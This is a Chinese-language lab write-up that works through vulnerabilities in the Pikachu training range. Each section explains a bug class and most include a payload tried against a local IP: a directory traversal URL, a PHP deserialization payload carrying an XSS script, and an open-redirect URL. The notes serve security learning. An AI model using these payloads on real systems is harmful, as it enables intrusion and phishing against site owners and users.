### 目录遍历

![image-20230816214623862](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816214623862.png)

![image-20230816214631696](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816214631696.png)

```
http://192.168.80.139/pikachu/vul/dir/dir_list.php?title=../../../../1.php
```

![image-20230816215002912](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816215002912.png)

# 11、敏感信息泄露

由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。                        

比如：

>  ---通过访问url下的目录，可以直接列出目录下的文件列表;
> ---输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;
> ---前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;

类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。                        因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。                     

### IcanseeyourABC

![image-20230817204635197](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817204635197.png)

查看页面代码，发现有一个`测试账号:lili/123456`

![image-20230817204707393](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817204707393.png)

使用测试账户进行登录，发现  成功 登录

![image-20230817204758934](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817204758934.png)

![image-20230817204917155](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817204917155.png)

# 12、PHP反序列化

在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。

**序列化serialize()**
序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:            

```php
    class S{
        public $test="pikachu";
    }
    $s=new S(); //创建一个对象
    serialize($s); //把这个对象进行序列化
    序列化后得到的结果是这个样子的:O:1:"S":1:{s:4:"test";s:7:"pikachu";}
        O:代表object
        1:代表对象名字长度为一个字符
        S:对象的名称
        1:代表对象里面有一个变量
        s:数据类型
        4:变量名称的长度
        test:变量名称
        s:数据类型
        7:变量值的长度
        pikachu:变量值
    
```

**反序列化unserialize()**

就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。

```php
    $u=unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
    echo $u->test; //得到的结果为pikachu
    
```

序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题

```php
        常见的几个魔法函数:
        __construct()当一个对象创建时被调用

        __destruct()当一个对象销毁时被调用

        __toString()当一个对象被当作一个字符串使用

        __sleep() 在对象在被序列化之前运行

        __wakeup将在序列化之后立即被调用

        漏洞举例:

        class S{
            var $test = "pikachu";
            function __destruct(){
                echo $this->test;
            }
        }
        $s = $_GET['test'];
        @$unser = unserialize($a);

        payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}

    
```

​    

### PHP反序列化漏洞

# 13、XXE

XXE -"xml external entity injection"
既"xml外部实体注入漏洞"。
概括一下就是"攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题"

也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。
                

    具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。                
    现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。
    以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。

本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。             

### XXE漏洞

# 14、URL重定向

不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。

  如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话 就可能发生"跳错对象"的问题。                
                

    url跳转比较直接的危害是:
    -->钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站

### 不安全的URL跳转

![image-20230817205449771](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817205449771.png)

在点击第四个链接的 时候，地址栏的url发生了变化，地址栏后面多了参数`?url=`

![image-20230817205534654](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817205534654.png)

修改`?url=`后面的值为`http://www.baidu.com`

```
http://192.168.80.139/pikachu/vul/urlredirect/urlredirect.php?url=http://www.baidu.com
```

回车之后跳转到百度的页面

![image-20230817205801977](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817205801977.png)

# 15、SSRF

**SSRF(Server-Side Request Forgery:服务器端请求伪造)**

其形成的原因大都是由于服务端**提供了从其他服务器应用获取数据的功能**,但又没有对目标地址做严格过滤与限制

导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据

**数据流:攻击者----->服务器---->目标地址**

根据后台使用的函数的不同,对应的影响和利用方法又有不一样            

```php
PHP中下面函数的使用不当会导致SSRF:
file_get_contents()
fsockopen()
curl_exec()        
```

 如果一定要通过后台服务器远程去对用户指定("或者预埋在前端的请求")的地址进行资源请求,**则请做好目标地址的过滤**。 
